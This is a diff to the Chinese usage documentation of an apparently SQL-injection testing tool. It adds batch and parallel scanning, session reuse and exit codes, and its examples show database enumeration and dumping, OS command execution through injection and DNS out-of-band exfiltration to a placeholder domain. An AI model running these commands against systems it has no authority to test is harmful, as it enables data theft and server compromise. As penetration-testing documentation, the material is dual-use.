@@ -6,6 +6,7 @@
 目标:
   -u URL                  目标 URL（自动识别 GET 参数）
   -r FILE                 从文件加载原始 HTTP 请求报文
+  -m FILE                 批量检测：URL 列表文件（逐行一个，# 开头注释；仅检测不取数，--parallel 多目标并发）
   --data=DATA             POST 表单数据（k=v&k2=v2）
   --cookie=COOKIE         Cookie 头
   --header="K: V"         自定义请求头（可多次）
@@ -17,8 +18,13 @@
   --risk=N                风险级别 1-3（默认 1）
   --technique=BEUTSD      技术筛选：B布尔 E报错 U联合 T时间 S堆叠 D DNS外带
   --dbms=DBMS             指定数据库（mysql/pgsql/sqlserver/sqlite/oracle/access/db2/dm/...）
-  --smart                 智能模式（无迹象参数快速跳过）
+  --smart                 智能模式（默认已开启，仅为兼容保留）
+  --no-smart              关闭智能模式（非动态参数也全量检测）
   --exhaustive            穷举模式（同技术测完全部用例）
+  --parallel              多参数并行检测；-m 批量模式下为多目标并发（并发度取 --threads）
+  --stop-waf              WAF 拦截累计 5 次即停止检测
+  --keep-testing          检出注入后仍继续检测其余参数（默认检出即停）
+  --flush-session         强制重新检测（默认同目标+同报文+同检测参数自动复用会话，免重复发包）
   --dns-domain=D          DNS 外带接收域名（配合 --dns-token）
 
 请求:
@@ -92,11 +98,19 @@ SuperSQLInjectionV2.Cmd -u "http://target/app/mysql.jsp?id=1" --os-cmd="whoami"
 
 # DNS 外带（无回显场景）
 SuperSQLInjectionV2.Cmd -u "http://target/page.php?id=1" --technique=D --dns-domain=dnslog.example.com --dns-token=TOKEN --dbs
+
+# 批量检测（URL 列表文件，仅检测；--parallel 并发）
+SuperSQLInjectionV2.Cmd -m urls.txt --parallel --threads=5
+
+# 二次运行同目标取数：自动复用会话跳过检测；强制重测加 --flush-session
+SuperSQLInjectionV2.Cmd -u "http://target/app/mysql.jsp?id=1" --dbs          # 首次：检测+取数
+SuperSQLInjectionV2.Cmd -u "http://target/app/mysql.jsp?id=1" --tables -D mydb  # 复用会话直接取数
 ```
 
 ## 输出约定
 
-- 控制台末尾打印检测报告（参数/注入类型/数据库/列数显示位）与动作结果。
-- `output/<host>_<port>/session.json`：检出的注入点（供追溯）。
+- 控制台末尾打印检测报告（参数/注入类型/数据库(含Fork衍生库)/列数显示位）与动作结果。
+- `output/<host>_<port>/session.json`：检测会话（注入点全字段+指纹），同目标同报文同检测参数再次运行自动复用跳过检测；`--flush-session` 强制重测。
 - `output/<host>_<port>/dump_<库>_<表>_<时间>.csv`：dump 落盘文件。
 - 退出即完成，无交互（--batch 默认）。
+- 退出码：0=成功/批量有命中；1=未检出注入；2=参数/输入错误；3=运行异常；4=目标无法连接。
